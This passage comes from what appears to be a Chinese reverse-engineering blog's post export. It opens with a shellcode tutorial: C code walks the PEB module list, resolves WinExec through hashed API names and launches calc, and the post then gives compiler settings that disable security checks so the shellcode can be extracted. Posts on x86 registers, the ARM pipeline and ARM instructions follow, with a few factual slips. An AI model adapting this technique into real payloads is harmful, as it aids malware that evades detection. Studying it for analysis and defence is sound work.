PEB：是一个位于所有进程内存中固定位置的结构体。此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。 typedef struct _PEB &#123; BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; &#125; PEB, *PPEB; 上面是微软关于PEB结构体的官方文档， 上面内容的一些概念 BYTE表示1个字节 PVOID表示1个指针（或1个内存地址，ps：一定要弄明白指针这东西，很重要）在0x86中一个地址占四个字节 PPEB_LDR_DATA是1个指针，指向自定义结构体PEB_LDR_DATAPEB_LDR_DATA BeingDebugged标志是1个字节 Reserved1[2]是两个BYTE的数组，占两个字节 Reserved3[2]是两个PVOID指针的数组，占八个字节 我们重点关注下PEB_LDR_DATA（跳转到0xC偏移处读取Ldr指针 ） 跳转偏移计算：2 + 1 + 1 + 8 &#x3D; 12 &#x3D; 0xC typedef struct _PEB_LDR_DATA &#123; BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; &#125; PEB_LDR_DATA, *PPEB_LDR_DATA; 关注LIST_ENTRY InMemoryOrderModuleList（跳转到0x14偏移处读取 InMemoryOrderModuleList字段） 跳转偏移计算：8 + 12 &#x3D; 20 &#x3D; 0x14 typedef struct _LIST_ENTRY &#123; struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; &#125; LIST_ENTRY, *PLIST_ENTRY; LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink） InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段。但是它不是指向 LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。 上面操作完到了内存首个模块的InMemoryOrderLinks元素，这个模块是一个可执行文件（.exe），我们需要去遍历加载到内存的dll文件。 具体通过InMemoryOrderModuleList.Flink来访问第二个已加载的模块，通过循环操作就可以遍历所有已加载的模块 calc.exe ntdll.dll kernel32.dll 当我们通过遍历得到kernel32.dll后就可以完成下面操作了 获取kernel32.dll 基地址； 定位 GetProcAddress函数的地址； 使用GetProcAddress确定 LoadLibrary函数的地址； 然后使用 LoadLibrary加载DLL文件（例如user32.dll）； 使用 GetProcAddress查找某个函数的地址（例如MessageBox）； 指定函数参数； 调用函数。 这边有个代码模版，如果你实在不会写可以参考这个模版来理解上述操作 #include&lt;Windows.h&gt; #include&lt;winnt.h&gt; #include&lt;winternl.h&gt; DWORD getHash(char* str) &#123; DWORD h = 0; while (*str) &#123; h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13)); h += *str &gt;= &#x27;a&#x27; ? *str - 32 : *str; str++; &#125; return h; &#125; DWORD getunicodeHash(wchar_t* str) &#123; DWORD h = 0; PWORD ptr = (PWORD)str; while (*ptr) &#123; h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13)); h += (BYTE)(*ptr) &gt;= &#x27;a&#x27; ? (BYTE)(*ptr) - 32 : (BYTE)(*ptr); ptr++; &#125; return h; &#125; PVOID getWinExec() &#123; char dllname[] = &#123; &#x27;K&#x27;,&#x27;E&#x27;,&#x27;R&#x27;,&#x27;N&#x27;,&#x27;E&#x27;,&#x27;L&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;D&#x27;,&#x27;L&#x27;,&#x27;L&#x27;,&#x27;\\x00&#x27; &#125;; char api[] = &#123; &#x27;W&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;E&#x27;,&#x27;x&#x27;,&#x27;e&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27; &#125;; _PEB* peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock; LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink; LIST_ENTRY* ptr = first; do &#123; LDR_DATA_TABLE_ENTRY* dte = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - 0x8); BYTE* baseAddress = (BYTE*)dte-&gt;DllBase; ptr = ptr-&gt;Flink; if (!baseAddress) continue; PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader-&gt;e_lfanew); DWORD iedRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (!iedRVA) continue; PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + iedRVA); if (getunicodeHash(((decltype(dte-&gt;FullDllName)*)(DWORD*)&amp;(dte-&gt;Reserved4))-&gt;Buffer) == getHash(dllname)) &#123; DWORD* nameRVAs = (DWORD*)(baseAddress + ied-&gt;AddressOfNames); for (DWORD i = 0; i &lt; ied-&gt;NumberOfNames; i++) &#123; char* funcName = (char*)(baseAddress + nameRVAs[i]); if (getHash(funcName) == getHash(api)) &#123; WORD ordinal = ((WORD*)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i]; DWORD functionRVA = ((DWORD*)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal]; return baseAddress + functionRVA; &#125; &#125; &#125; &#125; while (ptr != first); return NULL; &#125; void func() &#123; char exec[] = &#123; &#x27;c&#x27;,&#x27;a&#x27;,&#x27;l&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27;&#125;; decltype(WinExec)* myWinExec = (decltype(WinExec)*)getWinExec(); myWinExec(exec, 0); &#125; int main() &#123; func(); return 0; &#125; 上面代码执行完之后会弹出windows计算器 这里不讲windows可利用shellcode的编写，cs，msf都已经提供了很好用的shellcode 提取shellcode的提取 使用c++开发代码 更改VisualStudio编译配置 生成exe 在IDA下打开生成的exe，获得机器码 开发代码我们已经完成了，接下来是编译 配置编译选项，下面很多是默认的 release在调试工具栏 使大小最小化 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 最大优化（优选大小） 内联函数扩展 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 函数扩展(只适用于_inline(Ob1)) 启用内部函数 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 启用函数选择（是） 禁用安全检查(&#x2F;Gs-) 项目 - (你项目名称的)属性 - c&#x2F;c++ - 代码生成 - 安全检查（禁用） 启用函数级链接 项目 - (你项目名称的)属性 - c&#x2F;c++ - 代码生成 - 启用函数级链接(是) 增量链接 项目 - (你项目名称的)属性 - 链接器 - 常规 -启用增量链接 （否） 生成映射文件 项目 - (你项目名称的)属性 - 链接器 - 调试 - 生成映射文件 （是） 映射文件名随便写 启用COMDAT折叠 项目 - (你项目名称的)属性 - 链接器 - 优化 - 启用COMDAT折叠（是） 函数顺序 项目 - (你项目名称的)属性 - 链接器 - 优化 - 函数顺序 （function_order.txt） 关闭SDL检查 项目 - (你项目名称的)属性 - c&#x2F;c++ - SDL检查改为否 生成exe文件，用ida打开","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"intel x86寄存器及其汇编指令","slug":"逆/Intel_x86","date":"2021-08-29T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/ec08c5f4.html","link":"","permalink":"http://example.com/article/ec08c5f4.html","excerpt":"","text":"intel x86架构，复杂指令集，intel公司最成功的cpu架构。 x86代表32位架构 我们平时装计算机所说的64位，32位代表寻址能力不同，一些地方说是支持的内存，其本质还是寻址能力 32位最大寻址内存范围是2的32次方，即4GB 1B=1024K=2^10K 1GB=1024B=2^10B ∴4GB=2^2*2^10*2^10*2^10 =2^(2+10+10+10)=2^32``` 64位的最大寻址能力是2的64次方，即16384GB 但是，实际上限于种种原因，目前Windows 7 64位版仅能使用最大为192GB内存。 intel 系列向下兼容 具体发展历史和一些细节：https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin 寄存器八个通用寄存器：EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI 一个标志寄存器：EFLAGS 五个控制寄存器：分别为CR0-CR4 八个调试寄存器：分别为DR0-DR7 四个系统地址寄存器：GDTR、IDTR、LDTR和TR 其他寄存器：EIP、TSC等 通用寄存器八个通用寄存器大多时候可以通用，但是某些寄存器有隐含用法。 EAX累加器，很多加法乘法指令的缺省寄存器。 EBX基地址(base)寄存器, 在内存寻址时存放基地址。 ECX是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。 EDX总是被用来放整数除法产生的余数。 ESI&#x2F;EDI分别叫做”源&#x2F;目标索引寄存器(source&#x2F;destination index)，因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目的串. 源串和目的串（也有的叫目标串）： 如在strcpy(*d, *s); 这里s指向的字符串就是源字符串，d指向的为目的字符串 EBP是基址指针(BASE POINTER)，它最经常被用作高级语言函数调用的”框架指针”(frame pointer) ESP专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。 一般esp到ebp这段空间就是当前栈 标志寄存器 包含一组状态标志，系统标志以及一个控制标志 CF若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。 PF如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。 AF如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。 ZF若结果为0则将其置1，反之清零。 SF该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负) OF如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。 DF控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。 TF将该位设置为1以允许单步调试模式，清零则禁用该模式。 IF该标志用于控制处理器对可屏蔽中断请求的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。 IOPL指示当前运行任务的I&#x2F;O特权级，正在运行任务的当前特权级(CPL)必须小于或等于I&#x2F;O特权级才能允许访问I&#x2F;O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。 NT这个标志控制中断链和被调用任务。若当前任务与前一个执行任务相关则置1，反之则清零。 RF控制处理器对调试异常的响应。 VM置1以允许虚拟8086模式，清除则返回保护模式。 AC标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。 VIF该标志是IF标志的虚拟镜像，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展 VIP该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零，与VIF标志结合使用。 ID 程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。 控制寄存器CR0PE：CR0的位0是启用保护标志。当设置该位时即开启了保护模式；当复位时即进入实地址模式。这个标志仅开启段级保护，而并没有启用 分页机制。若要启用 分页机制，那么PE和PG标志都要置位。 分页机制：https://baike.baidu.com/item/分页 PG：CR0的位31是分页标志。当设置该位时即开启了分页机制；当复位时则禁止分页机制，此时所有线性地址等同于 物理地址。在开启这个标志之前必须已经或者同时开启PE标志。即若要启用分页机制，那么PE和PG标志都要置位。 WP：对于Intel 80486或以上的CPU，CR0的位16是 写保护（Write Proctect）标志。当设置该标志时，处理器会禁止 超级用户程序（例如 特权级0的程序）向用户级只读页面执行写操作；当该位复位时则反之。该标志有利于UNIX类操作系统在创建进程时实现写时复制（Copy on Write）技术。NE：对于Intel 80486或以上的CPU，CR0的位5是 协处理器错误（Numeric Error）标志。当设置该标志时，就启用了x87 协处理器错误的内部报告机制；若复位该标志，那么就使用PC形式的x87协处理器 错误报告机制。当NE为复位状态并且CPU的IGNNE输入引脚有信号时，那么数学协处理器x87错误将被忽略。当NE为复位状态并且CPU的IGNNE输入引脚无信号时，那么非屏蔽的数学协处理器x87错误将导致处理器通过FERR引脚在外部产生一个中断，并且在执行下一个等待形式浮点指令或WAIT&#x2F;FWAIT指令之前立刻停止指令执行。CPU的FERR引脚用于仿真外部 协处理器80387的ERROR引脚，因此通常连接到中断控制器输入请求引脚上。NE标志、IGNNE引脚和FERR引脚用于利用外部逻辑来实现PC形式的外部 错误报告机制。 启用保护模式PE（Protected Enable）位（位0）和开启 分页PG（Paging）位（位31）分别用于控制分段和分页机制。PE用于控制分段机制。如果PE&#x3D;1，处理器就工作在开启分段机制环境下，即运行在保护模式下。如果PE&#x3D;0，则处理器关闭了分段机制，并如同8086工作于实地址模式下。PG用于控制 分页机制。如果PG&#x3D;1，则开启了 分页机制。如果PG&#x3D;0， 分页机制被禁止，此时 线性地址被直接作为 物理地址使用。 如果PE&#x3D;0、PG&#x3D;0，处理器工作在实地址模式下；如果PG&#x3D;0、PE&#x3D;1，处理器工作在没有开启 分页机制的保护模式下；如果PG&#x3D;1、PE&#x3D;0，此时由于不在保护模式下不能启用分页机制，因此处理器会产生一个一般保护异常，即这种标志组合无效；如果PG&#x3D;1、PE&#x3D;1，则处理器工作在开启了分页机制的保护模式下。 当改变PE和PG位时，必须小心。只有当执行程序至少有部分代码和数据在线性地址空间和物理地址空间中具有相同地址时，我们才能改变PG位的设置。此时这部分具有相同地址的代码在 分页和未分页世界之间起着桥梁的作用。无论是否开启分页机制，这部分代码都具有相同的地址。另外，在开启分页（PG&#x3D;1）之前必须先刷新页高速缓冲TLB。在修改该了PE位之后程序必须立刻使用一条跳转指令，以刷新处理器执行管道中已经获取的不同模式下的任何指令。在设置PE位之前，程序必须初始化几个系统段和控制寄存器。在系统刚上电时，处理器被复位成PE&#x3D;0和PG&#x3D;0（即实模式状态），以允许引导代码在启用分段和分页机制之前能够初始化这些寄存器和数据结构。 CR2和CR3CR2和CR3用于分页机制。CR3含有存放页目录表页面的物理地址，因此CR3也被称为PDBR。因为页目录表页面是页对齐的，所以该寄存器只有高20位是有效的。而低12位保留供更高级处理器使用，因此在往CR3中加载一个新值时低12位必须设置为0。 调试寄存器GDTR全局描述符表寄存器，用于存放全局描述符表GDT的32位的线性基地址和16位的表限长值。基地址指定GDT表中字节0在线性地址空间中的地址，表长度指明GDT表的字节长度值。指令LGDT和SGDT分别用于加载和保存GDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。在保护模式初始化过程中必须给GDTR加载一个新值。 IDTR中断描述符表寄存器，与GDTR的作用类似，IDTR寄存器用于存放中断描述符表IDT的32位线性基地址和16位表长度值。指令LIDT和SIDT分别用于加载和保存IDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。 LDTR用于存放局部描述符表LDT的32位线性基地址、16位段限长和描述符属性值。指令LLDT和SLDT分别用于加载和保存LDTR寄存器的段描述符部分，包含LDT EIP存储我们cpu要读取指令的地址 TSC一个用于时间戳计数器的64位的寄存器，它在每个时钟信号到来时加一 指令集数据传送指令MOVmov指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存 pushpush指令将操作数压入内存的栈中 pop与push相反，将操作数从栈中取出 lea lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中 lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。 算术和逻辑指令ADD将两个操作数相加，且将相加后的结果保存到第一个操作数中。 SUB第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数。 INC和DECinc,dec分别表示将操作数自加1，自减1。 IMUL整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器 IDIVidiv指令完成整数除法操作，idiv只有一个操作数，此操作数为除数，而被除数则为EDX:EAX中的内容（一个64位的整数）。 AND, OR, XOR逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。 NOT位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。 NEG取负指令。 SHL, SHR位移指令，有两个操作数，第一个操作数表示被操作数，第二个操作数指示位移的数量。 控制转移指令JMP控制转移到label所指示的地址。 jcondition条件转移指令，条件转移指令依据机器状态字中的一些列条件状态转移。机器状态字中包括指示最后一个算数运算结果是否为0，运算结果是否为负数等。 je (jump when equal)jne (jump when not equal)jz (jump when last result was zero)jg (jump when greater than)jge (jump when greater than or equal to)jl (jump when less than)jle (jump when less than or equal to) CMPcmp指令比较两个操作数的值，并根据比较结果设置机器状态字中的条件码。此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。 CALL, RET这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。 ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"三级流水线","slug":"技/ThreeStagePipeline","date":"2021-08-22T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f5705223.html","link":"","permalink":"http://example.com/article/f5705223.html","excerpt":"","text":"一般处理器执行代码程序为，读一条，执行一条 而流水线则使用三个阶段处理： 取指，从储存器中取出指令 译码，识别指令 执行，处理指令，并将结果放回寄存器 arm可以在执行第一条指令的时候，对第二条指令进行译码，并且取出第三条指令 但是！ 无论处理器处于何种状态，程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的指令或者正在“译码”的指令 人们常以正在执行的指令做第一条参考，所以pc总是指向第三条指令，或者说是指向正在执行的指令地址再加两条指令地址 处理器处于ARM状态时，每条指令为4个字节，所以PC值为正在执行的指令地址加8字节，即是： PC值 &#x3D; 当前程序执行位置 + 8字节 处理器处于Thumb状态时，每条指令为2字节，所以PC值为正在执行的指令地址加4字节，即是： PC值 &#x3D; 当前程序执行位置 + 4字节","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"ARM寄存器及其汇编指令","slug":"逆/arm","date":"2021-08-16T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/c21195a7.html","link":"","permalink":"http://example.com/article/c21195a7.html","excerpt":"","text":"ARM处理器第一款RISC（精简指令集）微处理器，（arm）32位设计，但配有16位指令集（thumb） 32位和16位可以相互调用，且开销几乎为0 使用大量寄存器，功耗低，效率高 ps：具体发展，系列之类请参考百度百科：https://baike.baidu.com/item/arm/5907 arm寄存器arm包括37个寄存器，都是32位 31个通用寄存器，6个状态寄存器 arm有7种处理器模式，每个模式中有一组相应的寄存器 在任何一种处理器模式下可见的寄存器包括15个通用寄存器（r0-r14），一个或者两个状态寄存器，程序技术器（pc） 所有寄存器中，有些是各模式公用的物理寄存器，有些是某个模式独立拥有的物理寄存器 七个处理器模式： 用户模式（User），快速中断模式（FIQ），普通中断模式（IRQ），管理模式（Svc），数据访问中止模 （Abort），未定义指令中止模式（Und），系统模式（Sys） 寄存器用途r0 - r3：传参 r4 - r11：保存局部变量，但在thumb（16位程序）中，通常只能用r4-r7来保存局部变量 r12：ip寄存器 r13：栈帧，即sp r14：lr，被称为连接寄存器，用于保存子程序以及中断的返回地址 r15：程序计数器，即pc，但由于arm使用的是三级流水线结构，所以我们读取正确的pc的值之后应该在该值基础上加八个字节，即指向pc下两条指令的地址 ps：关于三级流水线，另一片相关文章会具体解释 CPSR：当前程序状态寄存器，在任何模式下可以被访问。包含条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位。CPSR在用户编程时由于存储条件码。 SPSR：每一种模式下都有一个状态寄存器SPSR，用于保存CPSR的状态，以便异常返回后恢复异常发生时的工作状态。用户模式和系统模式不是异常状态，所以没有SPSR，在这两种模式下访问SPSR，将产生不可预知的后果。 CPSR详解： ps：长度为32 cpsr包括条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位 通过上图就可以理解cpsr_cxsf的意思了 条件码标志N：结果是有符号的二进制补码情况下，结果为负的话N&#x3D;1，结果为非负的话N&#x3D;0 Z：结果如果为零的话Z&#x3D;1，结果非零的话Z&#x3D;0 C：有多种情况 对于加法指令（包括比较指令CMN），产生进位的话C&#x3D;1，否则C&#x3D;0。 对于减法指令（包括比较指令CMP），如果产生借位，则C&#x3D;0;否则C&#x3D;1。 对于有移位操作的非法指令，C为移位操作中最后移出位的值。 对于其他指令，C通常不变。 ps：比较指令CMN与CMP其实才是算数指令，之后会有详解 V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V&#x3D;1；如果无溢出发生，则V&#x3D;0；对于其他指令，V通常不发生变化 ARM指令集指令格式 {} {S} , {,} &lt;&gt;内是必须项，&#123;&#125;内是可选项，不写代表无条件执行 opcode 指令助记符，如LDR，STR 等 cond 执行条件，如EQ，NE 等 S 是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响 Rd 目标寄存器 Rn 第一个操作数的寄存器 operand2 第二个操作数 储存器访问指令ARM 处理是加载&#x2F;存储体系结构的典型的RISC处理器 对存储器的访问只能使用加载和存储指令实现 ARM 的加载&#x2F;存储指令是可以实现字、半字、无符&#x2F;有符字节操作 批量加载&#x2F;存储指令可实现一条指令加载&#x2F;存储多个寄存器的内容 SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等 ARM 处理器是冯.诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载&#x2F;存储指令进行 下图给出ARM存储访问指令表 LDR&#x2F;STR LDR{cond}{T} Rd,&lt;地址&gt;; STR{cond}{T} Rd,&lt;地址&gt;; LDR从内存中读取数据放入寄存器，STR用于将寄存器内的数据放到内存 LDR R2, [R7,#0x10+var_C] 将R7 + 0x10+var_C地址的数据放到R2 STR R3, [R7,#0x10+var_4] 将R3的数据储存在R7 + 0x10+var_4 {T}为可选项，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下 T在用户模式下无效，不能与前索引偏移一起使用T LDR Rd,[Rn] 零偏移，将Rn的值作为内存地址 LDR Rd,[Rn,#0x04]! 前索引偏移，将Rn+0x04地址的值放到Rd，并且更新Rn的值为Rn &#x3D; Rn + 0x04，如果没有后边感叹号，则Rn不更新 LDR Rd,label ; 程序相对偏移，label 为程序标号，label 必须是在当前指令的±4KB范围内 LDR Rd,[Rn],#0x04 后索引偏移，将Rn中的地址的数据加载到Rd中，然后将Rn更新Rn &#x3D; Rn + 0x04 ps：前索引偏移就是在索引前偏移，看有无！决定时候更新寄存器的内容。后索引偏移就是在索引后偏移，索引时并不偏移，索引后更新寄存器内容 LDM&#x2F;STM LDM{cond}&lt;模式&gt; Rn{!},reglist{^} STM{cond}&lt;模式&gt; Rn{!},reglist{^} LDM 加载多个寄存器，STM储存多个寄存器 主要用途是现场保护、数据复制、参数传送等 其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作) (1) IA：每次传送后地址加4 (2) IB：每次传送前地址加4 (3) DA：每次传送后地址减4 (4) DB：每次传送前地址减4 (5) FD：满递减堆栈 (6) ED：空递增堆栈 (7) FA：满递增堆栈 (8) EA：空递增堆栈 寄存器Rn为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15；缀!表示最后的地址写回到Rn中 寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9}，寄存器排列由小到大排列 ^后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回 使用^后缀进行数据传送且寄存器列表不包含PC时，加载&#x2F;存储的是用户模式的寄存器，而不是当前模式的寄存器 LDMIA R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新 STMIA R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新 STMFD SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈 LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回 SWP 寄存器和存储器交换指令 SWP{cond}{B} Rd,Rm,[Rn] SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中 B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同 SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换 SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零) ; 并将R2 的内容写入到该内存单元中(最低字节有效) ARM 数据处理指令MOV 数据传送指令 MOV{cond}{S} Rd,operand2 将8 位立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作 MOV R1#0x10 ;R1&#x3D;0x10 MOV R0,R1 ;R0&#x3D;R1 MOVS R3,R1,LSL #2 ;R3&#x3D;R1＜＜2，并影响标志位 MOV PC,LR ;PC&#x3D;LR ，子程序返回 MVN 数据非传送指令 MVN{cond}{S} Rd,operand2 将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数 MVN R1,#0xFF ;R1&#x3D;0xFFFFFF00 MVN R1,R2 ;将R2 取反，结果存到R1 ADD 加法运算指令 ADD{cond}{S} Rd,Rn,operand2 将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器 ADDS R1,R1,#1 ;R1&#x3D;R1+1 ADD R1,R1,R2 ;R1&#x3D;R1+R2 ADDS R3,R1,R2,LSL #2 ;R3&#x3D;R1+R2＜＜2 SUB 减法运算指令 SUB{cond}{S} Rd,Rn,operand2 用寄存器Rn 减去operand2。结果保存到Rd 中 SUBS R0,R0,#1 ;R0&#x3D;R0-1 SUBS R2,R1,R2 ;R2&#x3D;R1-R2 SUB R6,R7,#0x10 ;R6&#x3D;R7-0x10 RSB 逆向减法指令 RSB{cond}{S} Rd,Rn,operand2 用寄存器operand2 减法Rn，结果保存到Rd 中 RSB R3,R1,#0xFF00 ;R3&#x3D;0xFF00-R1 RSBS R1,R2,R2,LSL #2 ;R1&#x3D;R2＜＜2-R2&#x3D;R2×3 RSB R0,R1,#0 ;R0&#x3D;-R1 ADC 带进位加法指令 ADC{cond}{S} Rd,Rn,operand2 将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位，结果保存到Rd 寄存器 ADC R1,R1,R3 ;使用ADC 实现64 位加法，R1&#x3D;R1+R3 SBC 带进位减法指令 SCB{cond}{S}Rd,Rn,operand2 用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中 SBC R1,R1,R3 ;使用SBC 实现64 位减法，R1 &#x3D; R1 - R3 RSC 带进位逆向减法指令 RSC{cond}{S} Rd,Rn,operand2 用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中 RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 R3 &#x3D; 0 -R1 **AND **逻辑与操作指令 AND{cond}{S} Rd,Rn,operand2 将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中 逻辑与操作，都为1则返回1 ANDS R0,R0,#x01 ;R0&#x3D;R0&amp;0x01，取出最低位数据 AND R2,R1,R3 ;R2&#x3D;R1&amp;R3 **ORR **逻辑或操作指令 ORR{cond}{S} Rd,Rn,operand2 将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中 ORR R0,R0,#x0F ;将R0 的低4 位置1 MOV R1,R2,LSR #4 ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中 **EOR **逻辑异或操作指令 EOR{cond}{S}Rd,Rn,operand2 将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中 EOR R1,R1,#0x0F ;将R1 的低4 位取反 EOR R2,R1,R0 ;R2&#x3D;R1^R0 EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位 BIC 位清除指令 BIC{cond}{S}Rd,Rn,operand2 将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。 BIC R1,R1,#0x0F ;将R1 